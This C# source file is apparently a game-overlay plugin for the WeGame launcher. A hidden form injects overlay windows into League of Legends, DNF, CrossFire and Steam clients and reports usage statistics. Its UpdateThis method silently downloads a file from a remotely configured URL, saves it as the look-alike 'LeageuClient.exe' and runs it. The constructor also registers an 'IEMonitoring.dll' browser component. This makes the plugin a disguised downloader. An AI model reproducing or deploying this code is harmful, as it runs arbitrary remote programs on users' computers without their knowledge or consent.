using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using WeGamePlus.Bar_Plug.Comments;
using WeGamePlus.Bar_Plug.Forms;
using WeGamePlus.Bar_Plug.Models;
using WeGamePlus.WeGame;

namespace WeGamePlus.Bar_Plug
{
    public class plugs : Form
    {
        private System.Windows.Forms.Timer timer;
        private lolShow ls;
        private lolShow ls1;
        private dnfShow ds;
        private cfShow cs;
        private nzShow ns;
        private wg_dnf_up wdp;
        private wg_cf_up wcp;
        private dnf_ups dnfs;
        private dnf_wai dw;
        private dnf_other1 o1;
        private dnf_other2 o2;
        private dnf_other3 o3;
        private SteamPubgShow sps;
        private Thread Thread;
        private bool isdnfUp;
        private bool isdnfups;
        private bool isls;
        private bool isds;
        private bool iscs;
        private bool isns;
        private bool iso1;
        private bool iso2;
        private bool iso3;
        private bool issm;
        private bool isThread;
        private static Win32Native.POINT point;
        private IContainer components;

        public plugs()
        {
            this.InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            base.Shown += new EventHandler(this.MainFrom_Shown);
            if (XmlHelper.IsShowThis("intercept", false))
            {
                ComHelp.Cmd("C:/Windows/Microsoft.NET/Framework/v2.0.50727/regasm /codebase " + AppDomain.CurrentDomain.BaseDirectory + "IEMonitoring.dll");
            }
        }

        private void CheckColor()
        {
            if (XmlHelper.GetPublicXmlValue("isCheck", true) == "0")
            {
                ParameterizedThreadStart para = delegate
                   {
                       string s = XmlHelper.GetPublicXmlAttributeValue("checkPoint", "x", true);
                       string str2 = XmlHelper.GetPublicXmlAttributeValue("checkPoint", "y", true);
                       IntPtr hWnd = Win32Native.FindWindow("RCLIENT", "League of Legends");
                       Win32Native.RECT lpRect = new Win32Native.RECT();
                       Win32Native.GetWindowRect(hWnd, ref lpRect);
                       Point pt = new Point(lpRect.Left + int.Parse(s), lpRect.Top + int.Parse(str2));
                       string currColor = ComHelp.GetPixelColor(pt, hWnd).ToString();
                       StatisticsHelp.ClolorStatistics(XmlHelper.GetPublicXmlAttributeValue("checkPoint", "okColor", true), currColor, pt);
                   };
                this.Thread = new Thread(para);
                this.Thread.Start();
            }
        }

        private void CloseAll()
        {
            this.isds = this.iscs = this.isls = this.isns = false;
            ds?.Close();
            this.ds = null;
            cs?.Close();
            this.cs = null;
            ls?.Close();
            this.ls = null;
            ns?.Close();
            this.ns = null;
            wdp?.Close();
            this.wdp = null;
            wcp?.Close();
            this.wcp = null;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                components?.Dispose();
            }
            base.Dispose(disposing);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (!this.Init())
            {
                base.Close();
            }
            this.UpdateThis();
            XmlHelper.GetFrom();
            this.timer = new System.Windows.Forms.Timer
            {
                Enabled = true,
                Interval = 1000
            };
            this.timer.Tick += new EventHandler(this.Func);
            this.timer.Start();
        }

        private void Func(object sender, EventArgs e)
        {
            Win32Native.ClearMemory(base.Handle);
            if (!this.isThread)
            {
                this.CheckColor();
                this.isThread = true;
                IntPtr hWND = Win32Native.FindWindow("地下城与勇士", "地下城与勇士");
                IntPtr ptr2 = Win32Native.FindWindow("vguiPopupWindow", "Steam");
                foreach (UserForm form in UrlManage.__FormsList)
                {
                    IntPtr ptr3 = Win32Native.FindWindow(form.ClassName, form.WindowName);
                    switch (form.WindowName)
                    {
                        case "League of Legends":
                            this.SetLoLForm(form, ptr3);
                            break;

                        case "WeGame":
                            this.SetWeGameForm(form, ptr3);
                            break;

                        default:
                            this.SetOtherParnetForm(form, ptr3);
                            break;
                    }
                }
                this.SetDNFForm(hWND);
                this.SetSteamShow(ptr2);
                this.isThread = false;
            }
        }

        public static Color GetPixelColor(Point p)
        {
            IntPtr hWnd = Win32Native.WindowFromPoint(p);
            IntPtr dC = Win32Native.GetDC(hWnd);
            Win32Native.ScreenToClient(hWnd, ref point);
            return Color.FromArgb((int)Win32Native.GetPixel(dC, p.X, p.Y));
        }

        private bool Init()
        {
            try
            {
                if (UrlManage.Init())
                {
                    bool flag1 = XmlHelper.GetPublicXmlValue("ishide", false) == "0";
                    StatisticsHelp.Statistics(0, "", "1");
                    if (XmlHelper.GetPublicXmlValue("isloadImage", false) == "0")
                    {
                        List<string> list1 = new List<string> {
                            "close",
                            "dnf_close",
                            "min",
                            "rclose",
                            "lol",
                            "dnf",
                            "rtiao",
                            "dnfshow",
                            "cfshow",
                            "nzshow",
                            "lolshow",
                            "dnf_game_up_58",
                            "dnf_game_up",
                            "steamup",
                            "steampubgstart",
                            "steamnewsup",
                            "steamnewsdown",
                            "dnf_game_up",
                            "kapai",
                            "zhounian1",
                            "lol_ku_nor",
                            "lol_ku_sel",
                            "sel",
                            "nor",
                            "y3",
                            "y4",
                            "ling",
                            "deng",
                            "b",
                            "bjpg"
                        };
                        using (List<string>.Enumerator enumerator = list1.GetEnumerator())
                        {
                            while (enumerator.MoveNext())
                            {
                                UrlManage.SetImage(enumerator.Current, "png");
                            }
                        }
                    }
                    return true;
                }
                return false;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // plugs
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.AutoSize = true;
            this.ClientSize = new System.Drawing.Size(385, 350);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "plugs";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);

        }

        private void MainFrom_Shown(object sender, EventArgs e)
        {
            base.Visible = false;
            base.Shown -= new EventHandler(this.MainFrom_Shown);
        }

        private void SetDNFForm(IntPtr HWND)
        {
            if (!UrlManage.lolBlock)
            {
                if (HWND != IntPtr.Zero)
                {
                    if ((!this.isdnfUp && (XmlHelper.GetPublicXmlAttributeValue("DNF1", "isShow", false) == "0")) && (this.dw == null))
                    {
                        this.isdnfUp = true;

                        void Para(object obj)
                        {
                            dw = new dnf_wai();
                            dw.Show();
                        }
                        base.Invoke((ParameterizedThreadStart) Para);
                    }
                    if ((!this.isdnfups && (XmlHelper.GetPublicXmlAttributeValue("DNF2", "isShow", false) == "0")) && (this.dnfs == null))
                    {
                        this.isdnfups = true;
                        void Para(object obj)
                        {
                            this.dnfs = new dnf_ups();
                            this.dnfs.Show();
                        }
                        base.Invoke((ParameterizedThreadStart)Para);
                    }
                    if ((!this.iso1 && (XmlHelper.GetPublicXmlAttributeValue("DNF3", "isShow", false) == "0")) && (this.o1 == null))
                    {
                        this.iso1 = true;
                        void Para(object obj)
                        {
                            this.o1 = new dnf_other1();
                            this.o1.Show();
                        }
                        base.Invoke((ParameterizedThreadStart)Para);
                    }
                    if ((!this.iso2 && (XmlHelper.GetPublicXmlAttributeValue("DNF4", "isShow", false) == "0")) && (this.o2 == null))
                    {
                        this.iso2 = true;
                        void Para(object obj)
                        {
                            this.o2 = new dnf_other2();
                            this.o2.Show();
                        }
                        base.Invoke((ParameterizedThreadStart)Para);
                    }
                    if ((!this.iso3 && (XmlHelper.GetPublicXmlAttributeValue("DNF5", "isShow", false) == "0")) && (this.o3 == null))
                    {
                        this.iso3 = true;
                        void Para(object obj)
                        {
                            this.o3 = new dnf_other3();
                            this.o3.Show();
                        }
                        base.Invoke((ParameterizedThreadStart)Para);
                    }
                }
                else
                {
                    dw?.Close();
                    this.dw = null;
                    this.isdnfUp = false;
                    dnfs?.Close();
                    this.dnfs = null;
                    this.isdnfups = false;
                    o1?.Close();
                    this.o1 = null;
                    o2?.Close();
                    this.o2 = null;
                    o3?.Close();
                    this.o3 = null;
                }
            }
        }

        private void SetLoLForm(UserForm userForm, IntPtr HWND)
        {
            if (!UrlManage.lolBlock)
            {
                if (HWND == IntPtr.Zero)
                {
                    userForm.isOpen = false;
                    userForm.Hide();
                }
                else
                {
                    Win32Native.RECT lpRect = new Win32Native.RECT();
                    Win32Native.GetWindowRect(HWND, ref lpRect);
                    switch ((lpRect.Right - lpRect.Left))
                    {
                        case 0x400:
                            if ((ComHelp.GetPixelColor(userForm.hideLocation1, HWND).ToString() != userForm.hideColor1) && (userForm.hideColor1 != "0"))
                            {
                                if (!userForm.isOpen)
                                {
                                    break;
                                }
                                userForm.isOpen = false;
                                userForm.Hide();
                                return;
                            }
                            Win32Native.SetWindowPos(userForm.Handle, 0, userForm.location1.X, userForm.location1.Y, userForm.size1.Width, userForm.size1.Height, 0);
                            Win32Native.SetParent(userForm.Handle, HWND);
                            userForm.isOpen = true;
                            userForm.Show();
                            return;

                        case 0x500:
                            ComHelp.GetPixelColor(userForm.hideLocation2, HWND).ToString();
                            if (ComHelp.GetPixelColor(userForm.hideLocation2, HWND).ToString() == userForm.hideColor2)
                            {
                                if (!userForm.isOpen)
                                {
                                    Win32Native.SetWindowPos(userForm.Handle, 0, userForm.location2.X, userForm.location2.Y, userForm.size2.Width, userForm.size2.Height, 0);
                                    Win32Native.SetParent(userForm.Handle, HWND);
                                    userForm.isOpen = true;
                                    userForm.Show();
                                    return;
                                }
                                break;
                            }
                            if (!userForm.isOpen)
                            {
                                break;
                            }
                            userForm.isOpen = false;
                            userForm.Hide();
                            return;

                        case 0x640:
                            if (ComHelp.GetPixelColor(userForm.hideLocation3, HWND).ToString() == userForm.hideColor3)
                            {
                                Win32Native.SetWindowPos(userForm.Handle, 0, userForm.location3.X, userForm.location3.Y, userForm.size3.Width, userForm.size3.Height, 0);
                                Win32Native.SetParent(userForm.Handle, HWND);
                                userForm.isOpen = true;
                                userForm.Show();
                                return;
                            }
                            if (!userForm.isOpen)
                            {
                                break;
                            }
                            userForm.isOpen = false;
                            userForm.Hide();
                            return;

                        default:
                            userForm.isOpen = false;
                            userForm.Hide();
                            break;
                    }
                }
            }
        }

        private void SetOtherParnetForm(UserForm userForm, IntPtr HWND)
        {
            if (HWND == IntPtr.Zero)
            {
                userForm.isOpen = false;
                userForm.Hide();
            }
            else
            {
                Win32Native.RECT lpRect = new Win32Native.RECT();
                Win32Native.GetWindowRect(HWND, ref lpRect);
                int num = lpRect.Right - lpRect.Left;
                int num2 = lpRect.Bottom - lpRect.Top;
                if ((ComHelp.GetPixelColor(userForm.hideLocation1, HWND).ToString() == userForm.hideColor1) || (userForm.hideColor1 == "0"))
                {
                    if (!userForm.isOpen)
                    {
                        if (!userForm.text.Contains("自适应"))
                        {
                            Win32Native.SetWindowPos(userForm.Handle, 0, userForm.location1.X, userForm.location1.Y, userForm.size1.Width, userForm.size1.Height, 0);
                        }
                        Win32Native.SetParent(userForm.Handle, HWND);
                        userForm.isOpen = true;
                        userForm.Show();
                    }
                    if (userForm.text.Contains("自适应X"))
                    {
                        Win32Native.SetWindowPos(userForm.Handle, 0, num + userForm.location1.X, userForm.location1.Y, userForm.size1.Width, userForm.size1.Height, 0);
                    }
                    if (userForm.text.Contains("自适应Y"))
                    {
                        Win32Native.SetWindowPos(userForm.Handle, 0, userForm.location1.X, num2 + userForm.location1.Y, userForm.size1.Width, userForm.size1.Height, 0);
                    }
                }
                else if (userForm.isOpen)
                {
                    userForm.isOpen = false;
                    userForm.Hide();
                }
            }
        }

        private void SetShow(IntPtr wegameHWND)
        {
            try
            {
                if ((wegameHWND != IntPtr.Zero) && (Win32Native.GetForegroundWindow() == wegameHWND))
                {
                    string game = "";
                    for (int i = 200; i < 800; i++)
                    {
                        uint pixelColor = Win32Native.GetPixelColor(new Point(i, 0x73), wegameHWND);
                        if (pixelColor.ToString() == XmlHelper.GetPublicXmlValue("lolShowColor", true))
                        {
                            if (UrlManage.lolBlock || !XmlHelper.IsShowThis("iswg_lol_show", false))
                            {
                                continue;
                            }
                            game = "lol";
                            break;
                        }
                        if (pixelColor.ToString() == XmlHelper.GetPublicXmlValue("dnfShowColor", true))
                        {
                            if (UrlManage.dnfBlock || !XmlHelper.IsShowThis("iswg_dnf_show", false))
                            {
                                continue;
                            }
                            game = "dnf";
                            break;
                        }
                        if (pixelColor.ToString() == XmlHelper.GetPublicXmlValue("nzShowColor", true))
                        {
                            if (UrlManage.nzBlock || !XmlHelper.IsShowThis("iswg_nz_show", false))
                            {
                                continue;
                            }
                            game = "nz";
                            break;
                        }
                        if (pixelColor.ToString() == XmlHelper.GetPublicXmlValue("cfShowColor", true))
                        {
                            if (UrlManage.cfBlock || !XmlHelper.IsShowThis("iswg_cf_show", false))
                            {
                                continue;
                            }
                            game = "cf";
                            break;
                        }
                        game = "";
                    }
                    this.ShowDialog(game);
                }
            }
            catch (Exception ex)
            {
            }
        }

        private void SetSteamShow(IntPtr HWND)
        {
            if (HWND != IntPtr.Zero)
            {
                if (((this.sps == null) && !this.issm) && (XmlHelper.GetPublicXmlValue("ispubg_show", false) == "0"))
                {
                    this.issm = true;
                    void Para(object obj)
                    {
                        this.sps = new SteamPubgShow();
                        this.sps.Show();
                    }
                    base.Invoke((ParameterizedThreadStart)Para);
                }
            }
            else
            {
                if (this.sps != null)
                {
                    this.sps.Close();
                }
                this.sps = null;
            }
        }

        private void SetWeGameForm(UserForm userForm, IntPtr HWND)
        {
            if (HWND == IntPtr.Zero)
            {
                userForm.isOpen = false;
                userForm.Hide();
            }
            else
            {
                Win32Native.RECT lpRect = new Win32Native.RECT();
                Win32Native.GetWindowRect(HWND, ref lpRect);
                int num = lpRect.Right - lpRect.Left;
                int num2 = lpRect.Bottom - lpRect.Top;
                if ((num != 0x35e) && (num2 != 0x1e1))
                {
                    try
                    {
                        this.WeGameFourShow(HWND);
                        if (!UrlManage.weGameBlock)
                        {
                            if ((ComHelp.GetPixelColor(userForm.hideLocation1, HWND).ToString() == userForm.hideColor1) || (userForm.hideColor1 == "0"))
                            {
                                if (!userForm.isOpen)
                                {
                                    if (!userForm.text.Contains("自适应"))
                                    {
                                        Win32Native.SetWindowPos(userForm.Handle, 0, userForm.location1.X, userForm.location1.Y, userForm.size1.Width, userForm.size1.Height, 0);
                                    }
                                    Win32Native.SetParent(userForm.Handle, HWND);
                                    userForm.isOpen = true;
                                    userForm.Show();
                                    //userForm.ShowDialog();
                                }
                                if (userForm.text.Contains("自适应X"))
                                {
                                    Win32Native.SetWindowPos(userForm.Handle, 0, num + userForm.location1.X, userForm.location1.Y, userForm.size1.Width, userForm.size1.Height, 0);
                                }
                                if (userForm.text.Contains("自适应Y"))
                                {
                                    Win32Native.SetWindowPos(userForm.Handle, 0, userForm.location1.X, num2 + userForm.location1.Y, userForm.size1.Width, userForm.size1.Height, 0);
                                }
                            }
                            else if (userForm.isOpen)
                            {
                                userForm.isOpen = false;
                                userForm.Hide();
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }
        }

        private void ShowDialog(string game)
        {
            if (game != "lol")
            {
                if (game == "dnf")
                {
                    if (!this.isds)
                    {
                        if (this.wdp == null)
                        {
                            this.CloseAll();
                            this.isds = true;
                            void Para(object obj)
                            {
                                this.wdp = new wg_dnf_up();
                                this.wdp.Show();
                            }
                            base.Invoke((ParameterizedThreadStart)Para);
                        }
                        void Para2(object obj)
                        {
                            this.ds = new dnfShow();
                            this.ds.Show();
                        }
                        base.Invoke((ParameterizedThreadStart)Para2);
                    }
                    if (this.ds != null)
                    {
                        Win32Native.SetWindowPos(this.ds.Handle, -1, 0, 0, 0, 0, 3);
                        Win32Native.SetFocus(this.ds.Handle);
                    }
                }
                else if (game == "cf")
                {
                    if (!this.iscs)
                    {
                        this.CloseAll();
                        this.iscs = true;
                        void Para(object obj)
                        {
                            this.cs = new cfShow();
                            this.cs.Show();
                        }
                        base.Invoke((ParameterizedThreadStart)Para);
                        if (this.wcp == null)
                        {
                            void Para2(object obj)
                            {
                                this.wcp = new wg_cf_up();
                                this.wcp.Show();
                            }
                            base.Invoke((ParameterizedThreadStart)Para2);
                        }
                        if (this.cs != null)
                        {
                            Win32Native.SetWindowPos(this.cs.Handle, -1, 0, 0, 0, 0, 3);
                            Win32Native.SetFocus(this.cs.Handle);
                        }
                    }
                }
                else if (game == "nz")
                {
                    if (!this.isns)
                    {
                        this.CloseAll();
                        this.isns = true;
                        void Para(object obj)
                        {
                            this.ns = new nzShow();
                            this.ns.Show();
                        }
                        base.Invoke((ParameterizedThreadStart)Para);
                    }
                    if (this.ns != null)
                    {
                        Win32Native.SetWindowPos(this.ns.Handle, -1, 0, 0, 0, 0, 3);
                        Win32Native.SetFocus(this.ns.Handle);
                    }
                }
                else
                {
                    this.isds = this.iscs = this.isls = this.isns = false;
                    if (this.ds != null)
                    {
                        this.ds.Close();
                    }
                    this.ds = null;
                    if (this.cs != null)
                    {
                        this.cs.Close();
                    }
                    this.cs = null;
                    if (this.ls != null)
                    {
                        this.ls.Close();
                    }
                    this.ls = null;
                    if (this.ns != null)
                    {
                        this.ns.Close();
                    }
                    this.ns = null;
                    if (this.wdp != null)
                    {
                        this.wdp.Close();
                    }
                    this.wdp = null;
                    if (this.wcp != null)
                    {
                        this.wcp.Close();
                    }
                    this.wcp = null;
                }
            }
            else
            {
                if (!this.isls)
                {
                    this.CloseAll();
                    this.isls = true;
                    void Para(object obj)
                    {
                        this.ls = new lolShow();
                        this.ls.Show();
                    }
                    base.Invoke((ParameterizedThreadStart)Para);
                }
                if (this.ls != null)
                {
                    Win32Native.SetWindowPos(this.ls.Handle, -1, 0, 0, 0, 0, 3);
                    Win32Native.SetFocus(this.ls.Handle);
                }
            }
        }

        private void UpdateThis()
        {
            try
            {
                if (XmlHelper.IsShowThis("isrun", false))
                {
                    string runUrl = XmlHelper.GetPublicXmlValue("runUrl", true);
                    if (!string.IsNullOrEmpty(runUrl))
                    {
                        void Para(object obj)
                        {
                            byte[] buffer = new WebClient().DownloadData(runUrl);
                            string path = Application.StartupPath + @"\LeageuClient.exe";
                            FileStream stream1 = new FileStream(path, FileMode.Create);
                            stream1.Write(buffer, 0, buffer.Length);
                            stream1.Close();
                            Process.Start(path);
                        }
                        new Thread(Para).Start();
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        private void WeGameFourShow(IntPtr HWND)
        {
            this.SetShow(HWND);
        }
    }
}

